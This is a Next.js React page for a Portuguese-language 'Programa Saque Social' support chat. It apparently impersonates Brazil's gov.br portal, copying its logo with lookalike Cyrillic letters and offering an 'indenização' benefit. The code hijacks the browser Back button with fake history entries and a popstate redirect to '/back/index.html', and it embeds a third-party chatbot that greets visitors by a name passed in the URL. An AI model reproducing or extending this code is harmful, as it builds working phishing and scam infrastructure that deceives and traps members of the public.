
"use client";

import React, { useState, useEffect, Suspense } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css'; // Styles specific to this chat page

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [isLoading, setIsLoading] = useState(true);
  const [headerUserName, setHeaderUserName] = useState('Usuário');

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    // Capture searchParams on initial mount
    const currentQuery = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;

    history.pushState({}, "", window.location.href);
    history.pushState({}, "", window.location.href);

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    const loadingTimer = setTimeout(() => {
      setIsLoading(false);
    }, 1200);

    return () => {
      window.removeEventListener('popstate', handlePopState);
      clearTimeout(loadingTimer);
    };
  }, []); // Changed dependency to empty array

  useEffect(() => {
    const typebotElement = document.querySelector('typebot-standard');

    // Ensure the custom element is in the DOM and not already initialized
    if (typebotElement && !typebotElement.shadowRoot?.querySelector('.typebot-container')) {
      import('@typebot.io/js') // Dynamically import the installed package
        .then(module => {
          const Typebot = module.default; // Typebot exports its main object as default
          if (Typebot && typeof Typebot.initStandard === 'function') {
            console.log('Initializing Typebot from dynamically imported package...');
            Typebot.initStandard({
              typebot: "24lkdef", // Your Typebot ID
              apiHost: "https://chat.bestbot.info", // Your Typebot API host if self-hosted
            });
          } else {
            console.error('Typebot.initStandard not found on imported module:', module);
          }
        })
        .catch(err => {
          console.error('Error dynamically importing Typebot package:', err);
        });
    } else if (typebotElement && typebotElement.shadowRoot?.querySelector('.typebot-container')) {
        console.log('Typebot already initialized or element not ready for re-init.');
    } else if (!typebotElement) {
        console.error('Typebot standard element not found in DOM for dynamic import init.');
    }
  }, []); // Empty dependency array to run once on mount

  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
        {/* Removed modulepreload link as we are using npm package */}
      </Head>
      
      <div className="chat-page-body"> {/* This class should ideally be on document.body for global styles like overflow:hidden */}
        {isLoading && (
          <div id="loading-screen">
            <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <title>GОV.ВR</title>
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
        )}

        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 {/* The typebot-standard element for Typebot to attach to */}
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
